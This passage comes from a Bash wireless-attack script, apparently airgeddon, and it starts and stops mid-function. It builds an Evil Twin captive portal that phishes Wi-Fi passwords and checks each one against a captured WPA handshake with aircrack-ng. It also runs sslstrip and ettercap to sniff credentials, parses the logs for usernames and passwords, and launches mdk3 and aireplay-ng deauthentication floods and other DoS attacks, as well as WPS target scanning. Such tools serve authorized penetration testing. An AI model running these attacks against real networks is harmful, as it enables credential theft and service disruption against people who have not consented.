	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
	echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
	echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[${captive_portal_language},9]}</p>'"
	echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid}</span>'"
	echo -e "echo -e '\t\t\t\t</div>'"
	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},10]}</p>'"
	echo -e "echo -e '\t\t\t\t<label>'"
	echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[${captive_portal_language},11]}\"/><br/>'"
	echo -e "echo -e '\t\t\t\t</label>'"
	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},12]} <input type=\"checkbox\" id=\"showpass\"/></p>'"
	echo -e "echo -e '\t\t\t\t<input class=\"button\" id=\"formbutton\" type=\"button\" value=\"${et_misc_texts[${captive_portal_language},13]}\"/>'"
	echo -e "echo -e '\t\t\t</form>'"
	echo -e "echo -e '\t\t</div>'"
	echo -e "echo -e '\t</body>'"
	echo -e "echo '</html>'"
	echo -e "exit 0"
	} >> "${tmpdir}${webdir}${indexfile}"

	exec 4>"${tmpdir}${webdir}${checkfile}"

	cat >&4 <<-EOF
		#!/bin/bash
		echo '<!DOCTYPE html>'
		echo '<html>'
		echo -e '\t<head>'
		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
		echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
		echo -e '\t</head>'
		echo -e '\t<body>'
		echo -e '\t\t<div class="content">'
		echo -e '\t\t\t<center><p>'
	EOF

	cat >&4 <<-'EOF'
		POST_DATA=$(cat /dev/stdin)
		if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
			POST_DATA=${POST_DATA#*=}
			password=${POST_DATA/+/ }
			password=${password//[*&\/?<>]}
			password=$(printf '%b' "${password//%/\\x}")
			password=${password//[*&\/?<>]}
		fi

		if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
	EOF

	cat >&4 <<-EOF
			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
	EOF

	cat >&4 <<-'EOF'
			echo "${password}" >\
	EOF

	cat >&4 <<-EOF
			"${tmpdir}${webdir}${currentpassfile}"
			aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
	EOF

	cat >&4 <<-'EOF'
			if [ "$?" = "0" ]; then
	EOF

	cat >&4 <<-EOF
				touch "${tmpdir}${webdir}${successfile}"
				echo '${et_misc_texts[${captive_portal_language},18]}'
				et_successful=1
			else
	EOF

	cat >&4 <<-'EOF'
				echo "${password}" >>\
	EOF

	cat >&4 <<-EOF
				"${tmpdir}${webdir}${attemptsfile}"
				echo '${et_misc_texts[${captive_portal_language},17]}'
				et_successful=0
			fi
	EOF

	cat >&4 <<-'EOF'
		elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
	EOF

	cat >&4 <<-EOF
			echo '${et_misc_texts[${captive_portal_language},26]}'
			et_successful=0
		else
			echo '${et_misc_texts[${captive_portal_language},14]}'
			et_successful=0
		fi
		echo -e '\t\t\t</p></center>'
		echo -e '\t\t</div>'
		echo -e '\t</body>'
		echo '</html>'
	EOF

	cat >&4 <<-'EOF'
		if [ ${et_successful} -eq 1 ]; then
			exit 0
		else
			echo '<script type="text/javascript">'
			echo -e '\tsetTimeout("redirect()", 3500);'
			echo '</script>'
			exit 1
		fi
	EOF

	exec 4>&-
	sleep 3
}

#Launch lighttpd webserver for captive portal Evil Twin attack
function launch_webserver() {

	killall lighttpd > /dev/null 2>&1
	recalculate_windows_sizes
	if [ ${captive_portal_mode} = "internet" ]; then
		lighttpd_window_position=${g3_bottomright_window}
	else
		lighttpd_window_position=${g4_bottomright_window}
	fi
	xterm -hold -bg black -fg yellow -geometry "${lighttpd_window_position}" -T "Webserver" -e "lighttpd -D -f \"${tmpdir}${webserver_file}\"" > /dev/null 2>&1 &
	et_processes+=($!)
}

#Launch lighttpd webserver for captive portal Evil Twin attack
function launch_sslstrip() {

	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
	recalculate_windows_sizes
	xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "Sslstrip" -e "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k" > /dev/null 2>&1 &
	et_processes+=($!)
}

#Launch ettercap sniffer
function launch_sniffing() {

	recalculate_windows_sizes
	case ${et_mode} in
		"et_sniffing")
			sniffing_scr_window_position=${g3_bottomright_window}
		;;
		"et_sniffing_sslstrip")
			sniffing_scr_window_position=${g4_bottomright_window}
		;;
	esac
	ettercap_cmd="ettercap -i ${interface} -q -T -z -S -u"
	if [ ${ettercap_log} -eq 1 ]; then
		ettercap_cmd+=" -l \"${tmp_ettercaplog}\""
	fi

	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer" -e "${ettercap_cmd}" > /dev/null 2>&1 &
	et_processes+=($!)
}

#Parse ettercap log searching for captured passwords
function parse_ettercap_log() {

	echo
	language_strings "${language}" 304 "blue"

	readarray -t CAPTUREDPASS < <(etterlog -L -p -i "${tmp_ettercaplog}.eci" 2> /dev/null | egrep -i "USER:|PASS:")

	{
	echo ""
	date +%Y-%m-%d
	echo "${et_misc_texts[${language},8]}"
	echo ""
	echo "BSSID: ${bssid}"
	echo "${et_misc_texts[${language},1]}: ${channel}"
	echo "ESSID: ${essid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${tmpdir}parsed_file"

	pass_counter=0
	for cpass in "${CAPTUREDPASS[@]}"; do
		echo "${cpass}" >> "${tmpdir}parsed_file"
		pass_counter=$((pass_counter + 1))
	done

	if [ ${pass_counter} -eq 0 ]; then
		language_strings "${language}" 305 "yellow"
	else
		language_strings "${language}" 306 "blue"
		cp "${tmpdir}parsed_file" "${ettercap_logpath}" > /dev/null 2>&1
	fi

	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	language_strings "${language}" 115 "read"
}

#Write on a file the id of the captive portal Evil Twin attack processes
function write_et_processes() {

	for item in "${et_processes[@]}"; do
		echo "${item}" >> "${tmpdir}${webdir}${processesfile}"
	done
}

#Kill the Evil Twin processes
function kill_et_windows() {

	for item in "${et_processes[@]}"; do
		kill "${item}" &> /dev/null
	done
	kill ${et_process_control_window} &> /dev/null
}

#Convert capture file to hashcat format
function convert_cap_to_hashcat_format() {

	tmpfiles_toclean=1
	rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
	echo "1" | aircrack-ng "${enteredpath}" -J "${tmpdir}hctmp" -b "${bssid}" > /dev/null 2>&1
}

#Handshake tools menu
function handshake_tools_menu() {

	clear
	language_strings "${language}" 120 "title"
	current_menu="handshake_tools_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 124 "separator"
	language_strings "${language}" 121
	print_simple_separator
	language_strings "${language}" 122 clean_handshake_dependencies[@]
	print_simple_separator
	language_strings "${language}" 123
	print_hint ${current_menu}

	read -r handshake_option
	case ${handshake_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			capture_handshake
		;;
		6)
			contains_element "${handshake_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				clean_handshake_file_option
			fi
		;;
		7)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	handshake_tools_menu
}

#Execute the cleaning of a Handshake file
function exec_clean_handshake_file() {

	echo
	check_valid_file_to_clean "${filetoclean}"
	if [ "$?" != "0" ]; then
		language_strings "${language}" 159 "yellow"
	else
		wpaclean "${filetoclean}" "${filetoclean}" > /dev/null 2>&1
		language_strings "${language}" 153 "yellow"
	fi
	language_strings "${language}" 115 "read"
}

#Validate and ask for the parameters used to clean a Handshake file
function clean_handshake_file_option() {

	echo
	readpath=0

	if [ -z "${enteredpath}" ]; then
		language_strings "${language}" 150 "blue"
		readpath=1
	else
		language_strings "${language}" 151 "blue"
		ask_yesno 152
		if [ ${yesno} = "y" ]; then
			filetoclean="${enteredpath}"
		else
			readpath=1
		fi
	fi

	if [ ${readpath} -eq 1 ]; then
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "cleanhandshake"
		done
	fi

	exec_clean_handshake_file
}

#DoS attacks menu
function dos_attacks_menu() {

	clear
	language_strings "${language}" 102 "title"
	current_menu="dos_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 51 mdk3_attack_dependencies[@]
	language_strings "${language}" 52 aireplay_attack_dependencies[@]
	language_strings "${language}" 53 mdk3_attack_dependencies[@]
	language_strings "${language}" 54 "separator"
	language_strings "${language}" 62 mdk3_attack_dependencies[@]
	language_strings "${language}" 63 mdk3_attack_dependencies[@]
	language_strings "${language}" 64 mdk3_attack_dependencies[@]
	print_simple_separator
	language_strings "${language}" 59
	print_hint ${current_menu}

	read -r dos_option
	case ${dos_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			contains_element "${dos_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				mdk3_deauth_option
			fi
		;;
		6)
			contains_element "${dos_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				aireplay_deauth_option
			fi
		;;
		7)
			contains_element "${dos_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				wds_confusion_option
			fi
		;;
		8)
			contains_element "${dos_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				beacon_flood_option
			fi
		;;
		9)
			contains_element "${dos_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				auth_dos_option
			fi
		;;
		10)
			contains_element "${dos_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				michael_shutdown_option
			fi
		;;
		11)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac
	
	dos_attacks_menu
}

#Capture Handshake on Evil Twin attack
function capture_handshake_evil_twin() {

	if [[ ${enc} != "WPA" ]] && [[ ${enc} != "WPA2" ]]; then
		echo
		language_strings "${language}" 137 "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi

	capture_handshake_window

	case ${et_dos_attack} in
		"Mdk3")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			recalculate_windows_sizes
			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
			sleeptimeattack=12
		;;
		"Aireplay")
			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
			recalculate_windows_sizes
			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
			sleeptimeattack=12
		;;
		"Wds Confusion")
			recalculate_windows_sizes
			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
			sleeptimeattack=16
		;;
	esac

	processidattack=$!
	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null

	ask_yesno 145
	handshake_captured=${yesno}
	kill "${processidcapture}" &> /dev/null
	if [ "${handshake_captured}" = "y" ]; then

		handshakepath=$(env | grep ^HOME | awk -F = '{print $2}')
		lastcharhandshakepath=${handshakepath: -1}
		if [ "${lastcharhandshakepath}" != "/" ]; then
			handshakepath="${handshakepath}/"
		fi
		handshakefilename="handshake-${bssid}.cap"
		handshakepath="${handshakepath}${handshakefilename}"

		language_strings "${language}" 162 "yellow"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "writeethandshake"
		done

		cp "${tmpdir}${standardhandshake_filename}" "${et_handshake}"
		echo
		language_strings "${language}" 324 "blue"
		language_strings "${language}" 115 "read"
		return 0
	else
		echo
		language_strings "${language}" 146 "yellow"
		language_strings "${language}" 115 "read"
		return 2
	fi
}

#Capture Handshake on Handshake tools
function capture_handshake() {

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		explore_for_targets_option
	fi

	if [ "$?" != "0" ]; then
		return 1
	fi

	if [[ ${enc} != "WPA" ]] && [[ ${enc} != "WPA2" ]]; then
		echo
		language_strings "${language}" 137 "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi

	language_strings "${language}" 126 "yellow"
	language_strings "${language}" 115 "read"

	attack_handshake_menu "new"
}

#Check if file exists
function check_file_exists() {

	if [[ ! -f "${1}" || -z "${1}" ]]; then
		language_strings "${language}" 161 "yellow"
		return 1
	fi
	return 0
}

#Validate path
function validate_path() {

	dirname=${1%/*}

	if [[ ! -d "${dirname}" ]] || [[ "${dirname}" = "." ]]; then
		language_strings "${language}" 156 "yellow"
		return 1
	fi

	check_write_permissions "${dirname}"
	if [ "$?" != "0" ]; then
		language_strings "${language}" 157 "yellow"
		return 1
	fi

	lastcharmanualpath=${1: -1}
	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]]; then

		if [ "${lastcharmanualpath}" != "/" ]; then
			pathname="${1}/"
		else
			pathname="${1}"
		fi

		case ${2} in
			"handshake")
				enteredpath="${pathname}${standardhandshake_filename}"
				suggested_filename="${standardhandshake_filename}"
			;;
			"hashcatpot")
				suggested_filename="${hashcatpot_filename}"
				potenteredpath+="${hashcatpot_filename}"
			;;
			"ettercaplog")
				suggested_filename="${default_ettercaplogfilename}"
				ettercap_logpath="${ettercap_logpath}${default_ettercaplogfilename}"
			;;
			"writeethandshake")
				et_handshake="${pathname}${standardhandshake_filename}"
				suggested_filename="${standardhandshake_filename}"
			;;
		esac

		echo
		language_strings "${language}" 155 "yellow"
		return 0
	fi

	language_strings "${language}" 158 "yellow"
	return 0
}

#Check for write permissions on a given path
function check_write_permissions() {

	if [ -w "${1}" ]; then
		return 0
	fi
	return 1
}

#Create a var with the name passed to the function and reading the value from the user input
function read_and_clean_path() {

	settings="$(shopt -p extglob)"
	shopt -s extglob

	read -r var
	local regexp='^[ '"'"']*(.*[^ '"'"'])[ '"'"']*$'
	[[ ${var} =~ ${regexp} ]] && var="${BASH_REMATCH[1]}"
	eval "${1}=\$var"

	eval "${settings}"
}

#Read and validate a path
function read_path() {

	echo
	case ${1} in
		"handshake")
			language_strings "${language}" 148 "green"
			read_and_clean_path "enteredpath"
			if [ -z "${enteredpath}" ]; then
				enteredpath="${handshakepath}"
			fi
			validate_path "${enteredpath}" "${1}"
		;;
		"cleanhandshake")
			language_strings "${language}" 154 "green"
			read_and_clean_path "filetoclean"
			check_file_exists "${filetoclean}"
		;;
		"dictionary")
			language_strings "${language}" 180 "green"
			read_and_clean_path "DICTIONARY"
			check_file_exists "${DICTIONARY}"
		;;
		"targetfilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "enteredpath"
			check_file_exists "${enteredpath}"
		;;
		"rules")
			language_strings "${language}" 242 "green"
			read_and_clean_path "RULES"
			check_file_exists "${RULES}"
		;;
		"hashcatpot")
			language_strings "${language}" 233 "green"
			read_and_clean_path "potenteredpath"
			if [ -z "${potenteredpath}" ]; then
				potenteredpath="${hashcat_potpath}"
			fi
			validate_path "${potenteredpath}" "${1}"
		;;
		"ettercaplog")
			language_strings "${language}" 303 "green"
			read_and_clean_path "ettercap_logpath"
			if [ -z "${ettercap_logpath}" ]; then
				ettercap_logpath="${default_ettercap_logpath}"
			fi
			validate_path "${ettercap_logpath}" "${1}"
		;;
		"ethandshake")
			language_strings "${language}" 154 "green"
			read_and_clean_path "et_handshake"
			check_file_exists "${et_handshake}"
		;;
		"writeethandshake")
			language_strings "${language}" 148 "green"
			read_and_clean_path "et_handshake"
			if [ -z "${et_handshake}" ]; then
				et_handshake="${handshakepath}"
			fi
			validate_path "${et_handshake}" "${1}"
		;;
		"et_captive_portallog")
			language_strings "${language}" 317 "blue"
			read_and_clean_path "et_captive_portal_logpath"
			if [ -z "${et_captive_portal_logpath}" ]; then
				et_captive_portal_logpath="${default_et_captive_portal_logpath}"
			fi
			validate_path "${et_captive_portal_logpath}" "${1}"
		;;
	esac

	validpath="$?"
	return "${validpath}"
}

#Launch the DoS selection menu before capture a Handshake and process the captured file
function attack_handshake_menu() {

	if [ "${1}" = "handshake" ]; then
		ask_yesno 145
		handshake_captured=${yesno}
		kill "${processidcapture}" &> /dev/null
		if [ "${handshake_captured}" = "y" ]; then

			handshakepath=$(env | grep ^HOME | awk -F = '{print $2}')
			lastcharhandshakepath=${handshakepath: -1}
			if [ "${lastcharhandshakepath}" != "/" ]; then
				handshakepath="${handshakepath}/"
			fi
			handshakefilename="handshake-${bssid}.cap"
			handshakepath="${handshakepath}${handshakefilename}"

			language_strings "${language}" 162 "yellow"
			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "handshake"
			done

			cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
			echo
			language_strings "${language}" 149 "blue"
			language_strings "${language}" 115 "read"
			return
		else
			echo
			language_strings "${language}" 146 "yellow"
			language_strings "${language}" 115 "read"
		fi
	fi

	clear
	language_strings "${language}" 138 "title"
	current_menu="attack_handshake_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 139 mdk3_attack_dependencies[@]
	language_strings "${language}" 140 aireplay_attack_dependencies[@]
	language_strings "${language}" 141 mdk3_attack_dependencies[@]
	print_simple_separator
	language_strings "${language}" 147
	print_hint ${current_menu}

	read -r attack_handshake_option
	case ${attack_handshake_option} in
		1)
			contains_element "${attack_handshake_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
				attack_handshake_menu "new"
			else
				capture_handshake_window
				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
				echo "${bssid}" > "${tmpdir}bl.txt"
				recalculate_windows_sizes
				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
				sleeptimeattack=12
			fi
		;;
		2)
			contains_element "${attack_handshake_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
				attack_handshake_menu "new"
			else
				capture_handshake_window
				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
				recalculate_windows_sizes
				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
				sleeptimeattack=12
			fi
		;;
		3)
			contains_element "${attack_handshake_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
				attack_handshake_menu "new"
			else
				capture_handshake_window
				recalculate_windows_sizes
				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
				sleeptimeattack=16
			fi
		;;
		4)
			return
		;;
		*)
			invalid_menu_option
			attack_handshake_menu "new"
		;;
	esac

	processidattack=$!
	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null

	attack_handshake_menu "handshake"
}

#Launch the Handshake capture window
function capture_handshake_window() {

	language_strings "${language}" 143 "blue"
	echo
	language_strings "${language}" 144 "yellow"
	language_strings "${language}" 115 "read"
	echo
	language_strings "${language}" 325 "blue"

	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry "${g1_topright_window}" -T "Capturing Handshake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${tmpdir}handshake" "${interface}" > /dev/null 2>&1 &
	processidcapture=$!
}

#Manage target exploration and parse the output files
function explore_for_targets_option() {

	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return 1
	fi

	echo
	language_strings "${language}" 66 "yellow"
	echo
	language_strings "${language}" 67 "yellow"
	language_strings "${language}" 115 "read"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1
	recalculate_windows_sizes
	xterm +j -bg black -fg white -geometry "${g1_topright_window}" -T "Exploring for targets" -e airodump-ng -w "${tmpdir}nws" "${interface}" > /dev/null 2>&1
	targetline=$(cat < "${tmpdir}nws-01.csv" | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}')
	targetline=$((targetline - 1))

	head -n "${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}nws.csv"
	tail -n +"${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}clts.csv"

	csvline=$(wc -l "${tmpdir}nws.csv" 2> /dev/null | awk '{print $1}')
	if [ "${csvline}" -le 3 ]; then
		echo
		language_strings "${language}" 68 "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi

	rm -rf "${tmpdir}nws.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
	i=0
	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ _ exp_power _ _ _ exp_idlength exp_essid _; do

		chars_mac=${#exp_mac}
		if [ "${chars_mac}" -ge 17 ]; then
			i=$((i+1))
			if [[ ${exp_power} -lt 0 ]]; then
				if [[ ${exp_power} -eq -1 ]]; then
					exp_power=0
				else
					exp_power=$((exp_power + 100))
				fi
			fi

			exp_power=$(echo "${exp_power}" | awk '{gsub(/ /,""); print}')
			exp_essid=${exp_essid:1:${exp_idlength}}
			if [[ "${exp_channel}" -gt 14 ]] || [[ "${exp_channel}" -lt 1 ]]; then
				exp_channel=0
			else
				exp_channel=$(echo "${exp_channel}" | awk '{gsub(/ /,""); print}')
			fi

			if [[ "${exp_essid}" = "" ]] || [[ "${exp_channel}" = "-1" ]]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')

			echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
		fi
	done < "${tmpdir}nws.csv"
	sort -t "," -d -k 4 "${tmpdir}nws.txt" > "${tmpdir}wnws.txt"
	select_target
}

#Manage target exploration only for Access Points with WPS activated. Parse output files and print menu with results
function explore_for_wps_targets_option() {

	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return 1
	fi

	echo
	language_strings "${language}" 66 "yellow"
	echo
	if ! grep -qe "${interface}" <(echo "${!wash_ifaces_already_set[@]}"); then
		language_strings "${language}" 353 "blue"
		set_wash_parametrization
		language_strings "${language}" 354 "yellow"
	else
		language_strings "${language}" 355 "blue"
	fi
	echo
	language_strings "${language}" 67 "yellow"
	language_strings "${language}" 115 "read"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
	recalculate_windows_sizes
	xterm +j -bg black -fg white -geometry "${g1_topright_window}" -T "Exploring for WPS targets" -e "wash -i \"${interface}\" ${wash_ifaces_already_set[${interface}]} | tee \"${tmpdir}wps.txt\"" > /dev/null 2>&1

	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_wash_large_version}"; then
		wash_start_data_line=7
	else
		wash_start_data_line=2
	fi

	washlines=$(wc -l "${tmpdir}wps.txt" 2> /dev/null | awk '{print $1}')
	if [ "${washlines}" -le ${wash_start_data_line} ]; then
		echo
		language_strings "${language}" 68 "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi

	clear
	language_strings "${language}" 104 "title"
	echo
	language_strings "${language}" 349 "green"
	print_large_separator

	i=0
	wash_counter=0
	declare -A wps_lockeds
	wps_lockeds[${wash_counter}]="No"
	while IFS=, read -r expwps_line; do

		i=$((i+1))

		if [ ${i} -le ${wash_start_data_line} ]; then
			continue
		else
			wash_counter=$((wash_counter+1))

			if [ ${wash_counter} -le 9 ]; then
				wpssp1=" "
			else
				wpssp1=""
			fi

			expwps_bssid=$(echo "${expwps_line}" | awk '{print $1}')
			expwps_channel=$(echo "${expwps_line}" | awk '{print $2}')
			expwps_power=$(echo "${expwps_line}" | awk '{print $3}')
			expwps_locked=$(echo "${expwps_line}" | awk '{print $5}')
			expwps_essid=$(echo "${expwps_line}" | awk '{$1=$2=$3=$4=$5=""; print $0}' | sed -e 's/^[ \t]*//')

			if [[ ${expwps_channel} -le 9 ]]; then
				wpssp2=" "
				if [[ ${expwps_channel} -eq 0 ]]; then
					expwps_channel="-"
				fi
			else
				wpssp2=""
			fi

			if [[ "${expwps_power}" = "" ]] || [[ "${expwps_power}" = "-00" ]]; then
				expwps_power=0
			fi

			if [[ ${expwps_power} =~ ^-0 ]]; then
				expwps_power=${expwps_power//0/}
			fi

			if [[ ${expwps_power} -lt 0 ]]; then
				if [[ ${expwps_power} -eq -1 ]]; then
					exp_power=0
				else
					expwps_power=$((expwps_power + 100))
				fi
			fi

			if [[ ${expwps_power} -le 9 ]]; then
				wpssp4=" "
			else
				wpssp4=""
			fi

			if [ "${expwps_locked}" = "Yes" ]; then
				wpssp3=""
			else
				wpssp3=" "
			fi

			wps_network_names[$wash_counter]=${expwps_essid}
			wps_channels[$wash_counter]=${expwps_channel}
			wps_macs[$wash_counter]=${expwps_bssid}
			wps_lockeds[$wash_counter]=${expwps_locked}
			echo -e " ${wpssp1}${wash_counter})   ${expwps_bssid}   ${wpssp2}${expwps_channel}    ${wpssp4}${expwps_power}%     ${expwps_locked}${wpssp3}   ${expwps_essid}"
		fi
	done < "${tmpdir}wps.txt"

	echo
	if [ ${wash_counter} -eq 1 ]; then
		language_strings "${language}" 70 "yellow"
		selected_wps_target_network=1
		language_strings "${language}" 115 "read"
	else
		print_large_separator
		language_strings "${language}" 3 "green"
		read -r selected_wps_target_network
	fi

	while [[ ${selected_wps_target_network} -lt 1 ]] || [[ ${selected_wps_target_network} -gt ${wash_counter} ]] || [[ ${wps_lockeds[${selected_wps_target_network}]} = "Yes" ]]; do

		if [[ ${selected_wps_target_network} -ge 1 ]] && [[ ${selected_wps_target_network} -le ${wash_counter} ]]; then
			if [ "${wps_lockeds[${selected_wps_target_network}]}" = "Yes" ]; then
				ask_yesno 350
				if [ ${yesno} = "y" ]; then
					break
				else
					echo
					language_strings "${language}" 3 "green"
					read -r selected_wps_target_network
					continue
				fi
			fi
		fi

		echo
		language_strings "${language}" 72 "yellow"
		echo
		language_strings "${language}" 3 "green"
		read -r selected_wps_target_network
	done

	wps_essid=${wps_network_names[${selected_wps_target_network}]}
	wps_channel=${wps_channels[${selected_wps_target_network}]}
	wps_bssid=${wps_macs[${selected_wps_target_network}]}
	wps_locked=${wps_lockeds[${selected_wps_target_network}]}
}

#Create a menu to select target from the parsed data
function select_target() {

	clear
	language_strings "${language}" 104 "title"
	echo
	language_strings "${language}" 69 "green"
	print_large_separator
	i=0
	while IFS=, read -r exp_mac exp_channel exp_power exp_essid exp_enc; do

		i=$((i+1))

		if [ ${i} -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		if [[ ${exp_channel} -le 9 ]]; then
			sp2=" "
			if [[ ${exp_channel} -eq 0 ]]; then
				exp_channel="-"
			fi
		else
			sp2=""
		fi

		if [[ "${exp_power}" = "" ]]; then
			exp_power=0
		fi

		if [[ ${exp_power} -le 9 ]]; then
			sp4=" "
		else
			sp4=""
		fi

		client=$(cat < "${tmpdir}clts.csv" | grep "${exp_mac}")
		if [ "${client}" != "" ]; then
			client="*"
			sp5=""
		else
			sp5=" "
		fi

		enc_length=${#exp_enc}
		if [ "${enc_length}" -gt 3 ]; then
			sp6=""
		elif [ "${enc_length}" -eq 0 ]; then
			sp6="    "
		else
			sp6=" "
		fi

		network_names[$i]=${exp_essid}
		channels[$i]=${exp_channel}
		macs[$i]=${exp_mac}
		encs[$i]=${exp_enc}
		echo -e " ${sp1}${i})${client}  ${sp5}${exp_mac}   ${sp2}${exp_channel}    ${sp4}${exp_power}%   ${exp_enc}${sp6}   ${exp_essid}"
	done < "${tmpdir}wnws.txt"

	echo
	if [ ${i} -eq 1 ]; then
		language_strings "${language}" 70 "yellow"
		selected_target_network=1
		language_strings "${language}" 115 "read"
	else
		language_strings "${language}" 71
		print_large_separator
		language_strings "${language}" 3 "green"
		read -r selected_target_network
	fi

